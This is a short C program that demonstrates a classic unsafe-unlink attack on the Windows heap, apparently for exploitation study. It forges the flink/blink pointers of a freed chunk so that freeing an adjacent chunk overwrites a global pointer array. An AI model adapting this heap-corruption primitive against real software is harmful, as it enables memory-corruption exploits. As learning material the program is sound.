#pragma warning( disable : 4996 )

#include <windows.h>
#include <heapapi.h>
#include <stdio.h>
#include <cstdio>

#define MY_INT INT64

struct chunk {
	MY_INT flink;
	MY_INT blink;
	//char content[0x10];
};

struct chunk* chunks[100];

int main()
{
	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000);
	int op, size, idx;

	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);

	for (int i = 0; i < 6; i++)
		chunks[i] = (struct chunk*)HeapAlloc(hHeap, HEAP_NO_SERIALIZE | HEAP_ZERO_MEMORY, sizeof(struct chunk));

	HeapFree(hHeap, HEAP_NO_SERIALIZE, chunks[2]);
	HeapFree(hHeap, HEAP_NO_SERIALIZE, chunks[4]);

	chunks[2]->flink = ((MY_INT)&chunks[2])-sizeof(MY_INT);
	chunks[2]->blink = (MY_INT)&chunks[2];

	printf("chunks[2] @ 0x%lx\n", chunks[2]);
	HeapFree(hHeap, HEAP_NO_SERIALIZE, chunks[1]);
	printf("chunks[2] @ 0x%lx\n", chunks[2]);
}